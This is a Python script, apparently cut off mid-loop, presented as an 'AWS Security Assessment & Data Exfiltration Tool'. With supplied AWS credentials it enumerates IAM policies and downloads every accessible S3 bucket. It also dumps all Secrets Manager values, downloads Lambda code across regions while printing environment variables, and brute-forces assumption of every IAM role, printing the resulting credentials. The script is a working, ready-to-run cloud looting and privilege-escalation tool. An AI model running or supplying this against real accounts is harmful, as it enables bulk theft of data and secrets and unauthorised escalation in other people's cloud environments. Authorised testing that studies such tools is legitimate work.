import boto3
import json
import os
from datetime import datetime
from pathlib import Path
from colorama import init, Fore, Back, Style
from tqdm import tqdm
from loguru import logger
import sys
import zipfile
import requests
from urllib.parse import urlparse

# Initialize colorama for cross-platform colored output
init(autoreset=True)

# Configure loguru logger
logger.remove()  # Remove default handler
logger.add(sys.stdout, format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <cyan>{name}</cyan>:<cyan>{function}</cyan>:<cyan>{line}</cyan> - <level>{message}</level>")
logger.add("aws_security_assessment.log", rotation="10 MB", retention="7 days")

def custom_serializer(obj):
    if isinstance(obj, datetime):
        return obj.isoformat()
    raise TypeError(f"Type {type(obj)} not serializable")

def print_policy_document(doc):
    print(f"{Fore.CYAN}{json.dumps(doc, indent=4, sort_keys=True)}{Style.RESET_ALL}")

def safe_filename(filename):
    """Convert S3 key to safe local filename/path"""
    safe_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_./\\"
    return ''.join(c if c in safe_chars else '_' for c in filename)

def download_s3_object(s3_client, bucket_name, obj_key, local_base_path, pbar=None):
    """Download S3 object and create necessary directories"""
    try:
        # Create safe local path
        safe_key = safe_filename(obj_key)
        local_path = Path(local_base_path) / safe_key
        
        # Create parent directories
        local_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Download file with progress
        logger.info(f"Downloading: {obj_key} -> {local_path}")
        s3_client.download_file(bucket_name, obj_key, str(local_path))
        
        if pbar:
            pbar.update(1)
            pbar.set_postfix_str(f"Downloaded: {obj_key[:50]}...")
        
        print(f"  {Fore.GREEN}✅ Downloaded: {obj_key}{Style.RESET_ALL}")
        return True
    except Exception as e:
        error_msg = f"Error downloading {obj_key}: {e}"
        logger.error(error_msg)
        print(f"  {Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
        return False

def download_lambda_code(lambda_client, function_name, local_base_path):
    """Download Lambda function code"""
    try:
        # Get function details including download URL
        function_response = lambda_client.get_function(FunctionName=function_name)
        code_location = function_response.get('Code', {}).get('Location')
        
        if not code_location:
            print(f"  {Fore.YELLOW}⚠️ No download URL available for {function_name}{Style.RESET_ALL}")
            return False
        
        # Create safe local path
        safe_name = safe_filename(function_name)
        local_path = Path(local_base_path) / f"{safe_name}.zip"
        
        # Create parent directories
        local_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Download the zip file
        logger.info(f"Downloading Lambda code: {function_name} -> {local_path}")
        response = requests.get(code_location, stream=True)
        response.raise_for_status()
        
        with open(local_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        # Also extract the zip for easy inspection
        extract_path = local_path.parent / safe_name
        extract_path.mkdir(exist_ok=True)
        
        with zipfile.ZipFile(local_path, 'r') as zip_ref:
            zip_ref.extractall(extract_path)
        
        print(f"  {Fore.GREEN}✅ Downloaded and extracted: {function_name}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}📁 ZIP: {local_path}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}📁 Extracted: {extract_path}{Style.RESET_ALL}")
        
        return True
        
    except Exception as e:
        error_msg = f"Error downloading Lambda code for {function_name}: {e}"
        logger.error(error_msg)
        print(f"  {Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
        return False

def analyze_lambda_functions(session, current_region):
    """Comprehensive Lambda function analysis"""
    print(f"\n{Fore.YELLOW}=== Lambda Functions Analysis ==={Style.RESET_ALL}")
    logger.info("Starting Lambda functions analysis")
    
    # Ask user about region scanning
    search_all_regions = input(f"{Fore.GREEN}Search Lambda functions in all regions? (y/n) [default: current region only]: {Style.RESET_ALL}").strip().lower()
    
    regions_to_scan = []
    if search_all_regions in ['y', 'yes']:
        print(f"{Fore.BLUE}Getting all available regions...{Style.RESET_ALL}")
        try:
            ec2_client = session.client('ec2', region_name=current_region)
            regions_response = ec2_client.describe_regions()
            regions_to_scan = [region['RegionName'] for region in regions_response['Regions']]
            print(f"{Fore.GREEN}Will scan {len(regions_to_scan)} regions: {', '.join(regions_to_scan)}{Style.RESET_ALL}")
            logger.info(f"Scanning Lambda functions in all {len(regions_to_scan)} regions")
        except Exception as e:
            print(f"{Fore.RED}❌ Error getting regions, falling back to current region: {e}{Style.RESET_ALL}")
            regions_to_scan = [current_region]
    else:
        regions_to_scan = [current_region]
        print(f"{Fore.CYAN}Scanning Lambda functions in current region: {current_region}{Style.RESET_ALL}")
        logger.info(f"Scanning Lambda functions in current region only: {current_region}")
    
    # Create lambda downloads directory
    lambda_dir = Path("lambda_downloads")
    lambda_dir.mkdir(exist_ok=True)
    
    total_functions_found = 0
    total_downloaded = 0
    
    # Process each region
    for region in regions_to_scan:
        print(f"\n{Fore.MAGENTA}🌍 Scanning region: {region}{Style.RESET_ALL}")
        logger.info(f"Scanning Lambda functions in region: {region}")
        
        try:
            lambda_client = session.client("lambda", region_name=region)
            region_functions, region_downloaded = analyze_lambda_functions_in_region(lambda_client, lambda_dir, region)
            total_functions_found += region_functions
            total_downloaded += region_downloaded
            
        except Exception as e:
            error_msg = f"Error scanning region {region}: {e}"
            logger.error(error_msg)
            print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
    
    # Final summary
    print(f"\n{Fore.GREEN}🌍 Multi-Region Lambda Summary:{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Regions scanned: {len(regions_to_scan)}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Total functions found: {total_functions_found}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}Total functions downloaded: {total_downloaded}{Style.RESET_ALL}")
    print(f"  {Fore.MAGENTA}Downloads saved to: ./lambda_downloads/{Style.RESET_ALL}")
    
    logger.info(f"Lambda analysis complete across {len(regions_to_scan)} regions: {total_functions_found} functions, {total_downloaded} downloaded")

def analyze_lambda_functions_in_region(lambda_client, lambda_dir, region):
    """Analyze Lambda functions in a specific region"""
    region_functions_count = 0
    region_downloaded_count = 0
    
    try:
        # List all Lambda functions in this region
        print(f"{Fore.BLUE}Discovering Lambda functions in {region}...{Style.RESET_ALL}")
        paginator = lambda_client.get_paginator('list_functions')
        functions = []
        
        for page in paginator.paginate():
            functions.extend(page.get('Functions', []))
        
        if not functions:
            print(f"{Fore.YELLOW}No Lambda functions found in {region}.{Style.RESET_ALL}")
            logger.info(f"No Lambda functions found in {region}")
            return 0, 0
        
        region_functions_count = len(functions)
        
        print(f"{Fore.GREEN}Found {len(functions)} Lambda functions in {region}:{Style.RESET_ALL}")
        logger.info(f"Found {len(functions)} Lambda functions in {region}")
        
        # Process each function
        downloaded_count = 0
        with tqdm(total=len(functions), desc=f"Analyzing Lambda functions in {region}", unit="function", colour="purple") as pbar:
            
            for func in functions:
                function_name = func['FunctionName']
                pbar.set_description(f"Analyzing {function_name[:30]}...")
                
                print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Function: {function_name}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                
                # Basic function info
                print(f"{Fore.MAGENTA}📋 Basic Information:{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Function Name: {func['FunctionName']}{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Runtime: {func.get('Runtime', 'N/A')}{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Handler: {func.get('Handler', 'N/A')}{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Code Size: {func.get('CodeSize', 0):,} bytes{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Timeout: {func.get('Timeout', 'N/A')} seconds{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Memory: {func.get('MemorySize', 'N/A')} MB{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}Last Modified: {func.get('LastModified', 'N/A')}{Style.RESET_ALL}")
                print(f"  {Fore.GREEN}ARN: {func.get('FunctionArn', 'N/A')}{Style.RESET_ALL}")
                
                if func.get('Role'):
                    print(f"  {Fore.YELLOW}Execution Role: {func['Role']}{Style.RESET_ALL}")
                
                # Get detailed configuration (including environment variables)
                try:
                    config = lambda_client.get_function_configuration(FunctionName=function_name)
                    
                    # Environment variables
                    env_vars = config.get('Environment', {}).get('Variables', {})
                    if env_vars:
                        print(f"\n{Fore.RED}🔑 Environment Variables (SENSITIVE!):{Style.RESET_ALL}")
                        for key, value in env_vars.items():
                            print(f"  {Fore.RED}{key}: {value}{Style.RESET_ALL}")
                        logger.warning(f"Found {len(env_vars)} environment variables in {function_name}")
                    else:
                        print(f"\n{Fore.BLUE}Environment Variables: None{Style.RESET_ALL}")
                    
                    # VPC Configuration
                    vpc_config = config.get('VpcConfig', {})
                    if vpc_config and vpc_config.get('VpcId'):
                        print(f"\n{Fore.CYAN}🌐 VPC Configuration:{Style.RESET_ALL}")
                        print(f"  {Fore.GREEN}VPC ID: {vpc_config.get('VpcId')}{Style.RESET_ALL}")
                        print(f"  {Fore.GREEN}Subnets: {', '.join(vpc_config.get('SubnetIds', []))}{Style.RESET_ALL}")
                        print(f"  {Fore.GREEN}Security Groups: {', '.join(vpc_config.get('SecurityGroupIds', []))}{Style.RESET_ALL}")
                    
                except Exception as e:
                    logger.error(f"Error getting detailed config for {function_name}: {e}")
                    print(f"  {Fore.RED}❌ Error getting detailed configuration: {e}{Style.RESET_ALL}")
                
                # Check resource-based policy (who can invoke)
                try:
                    policy_response = lambda_client.get_policy(FunctionName=function_name)
                    policy_doc = json.loads(policy_response['Policy'])
                    print(f"\n{Fore.RED}🚨 Resource-Based Policy (Invocation Permissions):{Style.RESET_ALL}")
                    print_policy_document(policy_doc)
                    
                    # Check for dangerous permissions
                    policy_str = json.dumps(policy_doc)
                    if '"Principal": "*"' in policy_str:
                        print(f"  {Fore.RED}⚠️  WARNING: Function allows public invocation!{Style.RESET_ALL}")
                        logger.warning(f"Function {function_name} allows public invocation")
                    
                except lambda_client.exceptions.ResourceNotFoundException:
                    print(f"\n{Fore.BLUE}Resource-Based Policy: None (function not publicly accessible){Style.RESET_ALL}")
                except Exception as e:
                    logger.error(f"Error getting policy for {function_name}: {e}")
                    print(f"  {Fore.RED}❌ Error getting resource policy: {e}{Style.RESET_ALL}")
                
                # Check for function URLs (direct HTTP endpoints)
                try:
                    url_config = lambda_client.get_function_url_config(FunctionName=function_name)
                    print(f"\n{Fore.RED}🌐 Function URL Configuration:{Style.RESET_ALL}")
                    print(f"  {Fore.GREEN}URL: {url_config.get('FunctionUrl')}{Style.RESET_ALL}")
                    print(f"  {Fore.GREEN}Auth Type: {url_config.get('AuthType')}{Style.RESET_ALL}")
                    print(f"  {Fore.GREEN}CORS: {url_config.get('Cors', 'Not configured')}{Style.RESET_ALL}")
                    
                    if url_config.get('AuthType') == 'NONE':
                        print(f"  {Fore.RED}⚠️  WARNING: Function URL is publicly accessible!{Style.RESET_ALL}")
                        logger.warning(f"Function {function_name} has public URL: {url_config.get('FunctionUrl')}")
                    
                except lambda_client.exceptions.ResourceNotFoundException:
                    print(f"\n{Fore.BLUE}Function URL: Not configured{Style.RESET_ALL}")
                except Exception as e:
                    logger.debug(f"Error getting function URL for {function_name}: {e}")
                
                # Check event source mappings
                try:
                    mappings = lambda_client.list_event_source_mappings(FunctionName=function_name)
                    event_sources = mappings.get('EventSourceMappings', [])
                    
                    if event_sources:
                        print(f"\n{Fore.CYAN}⚡ Event Source Mappings:{Style.RESET_ALL}")
                        for mapping in event_sources:
                            print(f"  {Fore.GREEN}Source ARN: {mapping.get('EventSourceArn')}{Style.RESET_ALL}")
                            print(f"  {Fore.GREEN}State: {mapping.get('State')}{Style.RESET_ALL}")
                            print(f"  {Fore.GREEN}Batch Size: {mapping.get('BatchSize')}{Style.RESET_ALL}")
                            if mapping.get('LastModified'):
                                print(f"  {Fore.GREEN}Last Modified: {mapping['LastModified']}{Style.RESET_ALL}")
                            print()
                    else:
                        print(f"\n{Fore.BLUE}Event Source Mappings: None{Style.RESET_ALL}")
                        
                except Exception as e:
                    logger.error(f"Error getting event sources for {function_name}: {e}")
                    print(f"  {Fore.RED}❌ Error getting event sources: {e}{Style.RESET_ALL}")
                
                # Download function code
                print(f"\n{Fore.YELLOW}📥 Attempting to download function code...{Style.RESET_ALL}")
                if download_lambda_code(lambda_client, function_name, lambda_dir / region):
                    downloaded_count += 1
                
                pbar.update(1)
        
        region_downloaded_count = downloaded_count
        
        # Region summary
        print(f"\n{Fore.GREEN}📊 {region} Lambda Summary:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Functions analyzed: {len(functions)}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Function code downloaded: {downloaded_count}{Style.RESET_ALL}")
        
        logger.info(f"Region {region} analysis complete: {len(functions)} functions, {downloaded_count} downloaded")
        
        return region_functions_count, region_downloaded_count
        
    except Exception as e:
        error_msg = f"Error during Lambda analysis in {region}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
        return 0, 0

def list_and_download_bucket(s3_client, bucket_name):
    """Recursively list and download all objects from a bucket"""
    print(f"\n{Fore.YELLOW}=== Processing Bucket: {bucket_name} ==={Style.RESET_ALL}")
    logger.info(f"Starting to process bucket: {bucket_name}")
    
    # Create local directory for bucket
    bucket_dir = Path("s3_downloads") / safe_filename(bucket_name)
    bucket_dir.mkdir(parents=True, exist_ok=True)
    
    try:
        # Get bucket location
        try:
            location = s3_client.get_bucket_location(Bucket=bucket_name)
            region = location.get('LocationConstraint', 'us-east-1')
            print(f"{Fore.CYAN}Bucket region: {region}{Style.RESET_ALL}")
            logger.info(f"Bucket {bucket_name} region: {region}")
        except Exception as e:
            logger.warning(f"Could not get bucket location for {bucket_name}: {e}")
            print(f"{Fore.YELLOW}Could not get bucket location: {e}{Style.RESET_ALL}")
        
        # First, count total objects for progress bar
        print(f"{Fore.BLUE}Counting objects in bucket...{Style.RESET_ALL}")
        paginator = s3_client.get_paginator('list_objects_v2')
        page_iterator = paginator.paginate(Bucket=bucket_name)
        
        total_objects = 0
        total_size = 0
        objects_list = []
        
        for page in page_iterator:
            if 'Contents' in page:
                for obj in page['Contents']:
                    total_objects += 1
                    total_size += obj['Size']
                    objects_list.append(obj)
        
        if total_objects == 0:
            print(f"{Fore.YELLOW}No objects found in bucket {bucket_name}{Style.RESET_ALL}")
            logger.info(f"No objects found in bucket {bucket_name}")
            return
        
        print(f"{Fore.GREEN}Found {total_objects} objects ({total_size:,} bytes / {total_size/1024/1024:.2f} MB){Style.RESET_ALL}")
        logger.info(f"Bucket {bucket_name}: {total_objects} objects, {total_size} bytes")
        
        # Download with progress bar
        downloaded_count = 0
        with tqdm(total=total_objects, desc=f"Downloading from {bucket_name}", 
                 unit="file", colour="green") as pbar:
            
            for obj in objects_list:
                obj_key = obj['Key']
                obj_size = obj['Size']
                
                pbar.set_description(f"Downloading {obj_key[:30]}... ({obj_size:,} bytes)")
                
                # Download the object
                if download_s3_object(s3_client, bucket_name, obj_key, bucket_dir, pbar):
                    downloaded_count += 1
        
        # Summary
        success_rate = (downloaded_count / total_objects) * 100
        print(f"\n{Fore.GREEN}Bucket Summary:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Total objects: {total_objects}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Successfully downloaded: {downloaded_count}{Style.RESET_ALL}")
        print(f"  {Fore.BLUE}Success rate: {success_rate:.1f}%{Style.RESET_ALL}")
        print(f"  {Fore.MAGENTA}Total size: {total_size:,} bytes ({total_size/1024/1024:.2f} MB){Style.RESET_ALL}")
        
        logger.info(f"Bucket {bucket_name} summary: {downloaded_count}/{total_objects} downloaded ({success_rate:.1f}%)")
        
    except Exception as e:
        error_msg = f"Error processing bucket {bucket_name}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

# Header
print(f"{Fore.CYAN}{Back.BLACK}")
print("=" * 60)
print("    AWS Security Assessment & Data Exfiltration Tool")
print("=" * 60)
print(f"{Style.RESET_ALL}")

logger.info("Starting AWS Security Assessment")

# Prompting for credentials and inputs
print(f"{Fore.YELLOW}Please provide AWS credentials:{Style.RESET_ALL}")
access_key = input(f"{Fore.GREEN}Enter AWS Access Key ID: {Style.RESET_ALL}").strip()
secret_access_key = input(f"{Fore.GREEN}Enter AWS Secret Access Key: {Style.RESET_ALL}").strip()
session_token = input(f"{Fore.GREEN}Enter AWS Session Token (leave blank if not using temporary credentials): {Style.RESET_ALL}").strip()
region = input(f"{Fore.GREEN}Enter AWS Region [default: us-east-1]: {Style.RESET_ALL}").strip() or 'us-east-1'
bucket = input(f"{Fore.GREEN}Enter specific S3 Bucket name (leave blank to scan all accessible buckets): {Style.RESET_ALL}").strip()

logger.info(f"Configured for region: {region}")
if session_token:
    logger.info("Using temporary credentials with session token")
    print(f"{Fore.CYAN}📋 Using temporary credentials (session token provided){Style.RESET_ALL}")
else:
    logger.info("Using permanent credentials (no session token)")
    print(f"{Fore.CYAN}🔑 Using permanent credentials (no session token){Style.RESET_ALL}")

# Initiating AWS session
print(f"\n{Fore.BLUE}Initializing AWS session...{Style.RESET_ALL}")
try:
    # Build session parameters
    session_params = {
        'aws_access_key_id': access_key,
        'aws_secret_access_key': secret_access_key,
        'region_name': region
    }
    
    # Add session token only if provided
    if session_token:
        session_params['aws_session_token'] = session_token
    
    session = boto3.Session(**session_params)

    # Initialize clients
    s3_client = session.client("s3")
    sts_client = session.client("sts")
    secrets_client = session.client("secretsmanager")
    iam_client = session.client("iam")
    lambda_client = session.client("lambda")
    
    print(f"{Fore.GREEN}✅ AWS session initialized successfully{Style.RESET_ALL}")
    logger.info("AWS session initialized successfully")
    
except Exception as e:
    error_msg = f"Failed to initialize AWS session: {e}"
    logger.error(error_msg)
    print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
    sys.exit(1)

# Print STS identity
username = None
print(f"\n{Fore.YELLOW}=== Identity Information ==={Style.RESET_ALL}")
try:
    sts_caller_info = sts_client.get_caller_identity()
    print(f"{Fore.CYAN}UserId: {sts_caller_info['UserId']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Account: {sts_caller_info['Account']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}ARN: {sts_caller_info['Arn']}{Style.RESET_ALL}")
    
    # Show credential type information
    if session_token:
        print(f"{Fore.MAGENTA}Credential Type: Temporary (using session token){Style.RESET_ALL}")
        if 'assumed-role' in sts_caller_info['Arn']:
            role_parts = sts_caller_info['Arn'].split('/')
            if len(role_parts) >= 2:
                assumed_role = role_parts[1]
                session_name = role_parts[2] if len(role_parts) > 2 else 'unknown'
                print(f"{Fore.YELLOW}Assumed Role: {assumed_role}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Session Name: {session_name}{Style.RESET_ALL}")
    else:
        print(f"{Fore.BLUE}Credential Type: Permanent (IAM user){Style.RESET_ALL}")
    
    logger.info(f"Identity: {sts_caller_info['Arn']}")

    arn_parts = sts_caller_info['Arn'].split('/')
    if len(arn_parts) >= 2:
        username = arn_parts[-1]
        logger.info(f"Extracted username: {username}")
        
except Exception as e:
    error_msg = f"Error getting caller identity: {e}"
    logger.error(error_msg)
    print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

# IAM user policy/group info (only for permanent credentials)
if username and not session_token:
    print(f"\n{Fore.YELLOW}=== IAM Info for User: {username} ==={Style.RESET_ALL}")
    logger.info(f"Analyzing IAM permissions for user: {username}")
    
    try:
        # Attached managed policies
        attached_policies = iam_client.list_attached_user_policies(UserName=username)
        print(f"\n{Fore.MAGENTA}Attached Managed Policies:{Style.RESET_ALL}")
        for policy in attached_policies.get("AttachedPolicies", []):
            print(f" {Fore.GREEN}- {policy['PolicyName']} (ARN: {policy['PolicyArn']}){Style.RESET_ALL}")
            logger.info(f"Found attached policy: {policy['PolicyName']}")
            
            policy_detail = iam_client.get_policy(PolicyArn=policy["PolicyArn"])
            version_id = policy_detail["Policy"]["DefaultVersionId"]
            policy_version = iam_client.get_policy_version(
                PolicyArn=policy["PolicyArn"],
                VersionId=version_id
            )
            print(f"   {Fore.BLUE}Permissions for {policy['PolicyName']}:{Style.RESET_ALL}")
            print_policy_document(policy_version["PolicyVersion"]["Document"])

        # Inline policies
        inline_policies = iam_client.list_user_policies(UserName=username)
        print(f"\n{Fore.MAGENTA}Inline Policies:{Style.RESET_ALL}")
        for policy_name in inline_policies.get("PolicyNames", []):
            print(f" {Fore.GREEN}- {policy_name}{Style.RESET_ALL}")
            logger.info(f"Found inline policy: {policy_name}")
            
            policy_doc = iam_client.get_user_policy(UserName=username, PolicyName=policy_name)
            print(f"   {Fore.BLUE}Permissions:{Style.RESET_ALL}")
            print_policy_document(policy_doc["PolicyDocument"])

        # Group memberships
        user_groups = iam_client.list_groups_for_user(UserName=username)
        print(f"\n{Fore.MAGENTA}Groups:{Style.RESET_ALL}")
        for group in user_groups.get("Groups", []):
            group_name = group['GroupName']
            print(f" {Fore.GREEN}- {group_name} (ARN: {group['Arn']}){Style.RESET_ALL}")
            logger.info(f"Found group membership: {group_name}")

            # Managed policies attached to group
            attached_group_policies = iam_client.list_attached_group_policies(GroupName=group_name)
            for policy in attached_group_policies.get("AttachedPolicies", []):
                print(f"   {Fore.CYAN}Attached Managed Policy: {policy['PolicyName']} (ARN: {policy['PolicyArn']}){Style.RESET_ALL}")
                policy_detail = iam_client.get_policy(PolicyArn=policy["PolicyArn"])
                version_id = policy_detail["Policy"]["DefaultVersionId"]
                policy_version = iam_client.get_policy_version(
                    PolicyArn=policy["PolicyArn"],
                    VersionId=version_id
                )
                print(f"     {Fore.BLUE}Permissions for {policy['PolicyName']}:{Style.RESET_ALL}")
                print_policy_document(policy_version["PolicyVersion"]["Document"])

            # Inline group policies
            inline_group_policies = iam_client.list_group_policies(GroupName=group_name)
            for policy_name in inline_group_policies.get("PolicyNames", []):
                print(f"   {Fore.CYAN}Inline Policy: {policy_name}{Style.RESET_ALL}")
                policy_doc = iam_client.get_group_policy(GroupName=group_name, PolicyName=policy_name)
                print(f"     {Fore.BLUE}Permissions:{Style.RESET_ALL}")
                print_policy_document(policy_doc["PolicyDocument"])

    except Exception as e:
        error_msg = f"Error fetching IAM details for {username}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

elif session_token:
    print(f"\n{Fore.YELLOW}=== Role-based Permissions (Session Token) ==={Style.RESET_ALL}")
    print(f"{Fore.CYAN}📋 Currently using temporary credentials from an assumed role.{Style.RESET_ALL}")
    print(f"{Fore.BLUE}ℹ️  IAM user policy enumeration skipped (not applicable for assumed roles).{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}🔍 The permissions are defined by the assumed role's policies.{Style.RESET_ALL}")
    logger.info("Skipping IAM user analysis - using assumed role credentials")

# S3 Bucket Discovery and Download
print(f"\n{Fore.YELLOW}=== S3 Bucket Analysis ==={Style.RESET_ALL}")
logger.info("Starting S3 bucket analysis")

# Create main download directory
Path("s3_downloads").mkdir(exist_ok=True)

if bucket:
    # Download specific bucket
    logger.info(f"Processing specific bucket: {bucket}")
    list_and_download_bucket(s3_client, bucket)
else:
    # List all accessible buckets and download from each
    try:
        print(f"{Fore.BLUE}Discovering accessible S3 buckets...{Style.RESET_ALL}")
        buckets_response = s3_client.list_buckets()
        buckets = buckets_response.get('Buckets', [])
        
        print(f"{Fore.GREEN}Found {len(buckets)} accessible buckets:{Style.RESET_ALL}")
        logger.info(f"Found {len(buckets)} accessible buckets")
        
        for i, bucket_info in enumerate(buckets, 1):
            bucket_name = bucket_info['Name']
            creation_date = bucket_info['CreationDate']
            print(f"{Fore.CYAN}{i}. {bucket_name} {Fore.YELLOW}(Created: {creation_date}){Style.RESET_ALL}")
        
        if buckets:
            print(f"\n{Fore.MAGENTA}Proceeding to download from all {len(buckets)} buckets...{Style.RESET_ALL}")
            
            # Process each bucket with overall progress
            with tqdm(total=len(buckets), desc="Processing buckets", unit="bucket", colour="blue") as bucket_pbar:
                for bucket_info in buckets:
                    bucket_name = bucket_info['Name']
                    bucket_pbar.set_description(f"Processing {bucket_name}")
                    list_and_download_bucket(s3_client, bucket_name)
                    bucket_pbar.update(1)
        else:
            print(f"{Fore.YELLOW}No accessible buckets found.{Style.RESET_ALL}")
            logger.info("No accessible buckets found")
            
    except Exception as e:
        error_msg = f"Error listing buckets: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

# List secrets
print(f"\n{Fore.YELLOW}=== Secrets Manager Analysis ==={Style.RESET_ALL}")
logger.info("Starting Secrets Manager analysis")

try:
    secrets_list = secrets_client.list_secrets()
    print(f"{Fore.CYAN}Secrets List:{Style.RESET_ALL}")
    print(f"{Fore.BLUE}{json.dumps(secrets_list, indent=4, sort_keys=True, default=custom_serializer)}{Style.RESET_ALL}")
    
    secret_count = len(secrets_list.get("SecretList", []))
    logger.info(f"Found {secret_count} secrets")
    
    if secret_count > 0:
        with tqdm(total=secret_count, desc="Retrieving secrets", unit="secret", colour="red") as secrets_pbar:
            for secret in secrets_list.get("SecretList", []):
                name = secret.get("Name")
                if name:
                    secrets_pbar.set_description(f"Retrieving {name[:30]}...")
                    try:
                        secret_dump = secrets_client.get_secret_value(SecretId=name)
                        print(f"\n{Fore.GREEN}Secret: {name}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}{json.dumps(secret_dump, indent=4, sort_keys=True, default=custom_serializer)}{Style.RESET_ALL}")
                        logger.info(f"Successfully retrieved secret: {name}")
                    except Exception as e:
                        error_msg = f"Error retrieving secret '{name}': {e}"
                        logger.error(error_msg)
                        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
                    
                    secrets_pbar.update(1)
    else:
        print(f"{Fore.YELLOW}No secrets found.{Style.RESET_ALL}")
        
except Exception as e:
    error_msg = f"Error listing secrets: {e}"
    logger.error(error_msg)
    print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

analyze_lambda_functions(session, region)

# Role discovery and assumption (only for permanent credentials to avoid confusion)
if not session_token:
    print(f"\n{Fore.YELLOW}=== Role Assumption Analysis ==={Style.RESET_ALL}")
    logger.info("Starting role assumption analysis")

    try:
        marker = None
        matching_roles = []
        attempted_roles = []
        successful_roles = []
        all_roles = []
        
        # First, collect all roles
        print(f"{Fore.BLUE}Collecting all IAM roles...{Style.RESET_ALL}")
        while True:
            roles_response = iam_client.list_roles(Marker=marker) if marker else iam_client.list_roles()
            all_roles.extend(roles_response["Roles"])
            
            if roles_response.get("IsTruncated"):
                marker = roles_response["Marker"]
            else:
                break
        
        logger.info(f"Found {len(all_roles)} total roles")
        print(f"{Fore.GREEN}Found {len(all_roles)} total roles{Style.RESET_ALL}")
        
        # Strategy 1: Check trust policies for potential matches
        print(f"\n{Fore.BLUE}Strategy 1: Analyzing trust policies...{Style.RESET_ALL}")
        with tqdm(total=len(all_roles), desc="Analyzing trust policies", unit="role", colour="yellow") as roles_pbar:
            for role in all_roles:
                role_name = role["RoleName"]
                role_arn = role["Arn"]
                trust_policy = role["AssumeRolePolicyDocument"]
                trust_policy_json = json.dumps(trust_policy)
                
                roles_pbar.set_description(f"Analyzing {role_name[:30]}...")
                
                # Check multiple conditions for potential assumability
                potentially_assumable = False
                reason = []
                
                if username and username in trust_policy_json:
                    potentially_assumable = True
                    reason.append(f"username '{username}' found in trust policy")
                
                if sts_caller_info and sts_caller_info['Arn'] in trust_policy_json:
                    potentially_assumable = True
                    reason.append(f"user ARN found in trust policy")
                
                if sts_caller_info and sts_caller_info['Account'] in trust_policy_json:
                    potentially_assumable = True
                    reason.append(f"account ID found in trust policy")
                
                # Check for wildcard or broad permissions
                if '"AWS": "*"' in trust_policy_json or '"Principal": "*"' in trust_policy_json:
                    potentially_assumable = True
                    reason.append("wildcard principal found")
                
                if potentially_assumable:
                    print(f"\n{Fore.MAGENTA}🎯 Role '{role_name}' potentially assumable:{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}- Role ARN: {role_arn}{Style.RESET_ALL}")
                    print(f" {Fore.GREEN}- Reason: {', '.join(reason)}{Style.RESET_ALL}")
                    print(f" {Fore.BLUE}- Trust Policy:{Style.RESET_ALL}")
                    print_policy_document(trust_policy)
                    matching_roles.append(role_name)
                    logger.info(f"Found potentially assumable role: {role_name} - {', '.join(reason)}")
                
                roles_pbar.update(1)
        
        # Strategy 2: Brute force attempt all roles (based on user permissions)
        print(f"\n{Fore.BLUE}Strategy 2: Brute force role assumption attempts...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Attempting to assume all roles (user has sts:AssumeRole permissions)...{Style.RESET_ALL}")
        
        with tqdm(total=len(all_roles), desc="Attempting role assumption", unit="role", colour="red") as attempt_pbar:
            for role in all_roles:
                role_name = role["RoleName"]
                role_arn = role["Arn"]
                
                attempt_pbar.set_description(f"Trying {role_name[:25]}...")
                attempted_roles.append(role_name)
                
                # Try to assume every role
                try:
                    session_name = f"SecurityTest-{username if username else 'Unknown'}-{role_name[:20]}"
                    assume_response = sts_client.assume_role(
                        RoleArn=role_arn,
                        RoleSessionName=session_name
                    )
                    
                    # Success!
                    print(f"\n{Fore.GREEN}🎉 SUCCESS: Assumed role '{role_name}'!{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}- Role ARN: {role_arn}{Style.RESET_ALL}")
                    
                    credentials = assume_response["Credentials"]
                    print(f" {Fore.YELLOW}📋 Temporary session credentials:{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}  - AccessKeyId: {credentials['AccessKeyId']}{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}  - SecretAccessKey: {credentials['SecretAccessKey'][:20]}...{Style.RESET_ALL}")
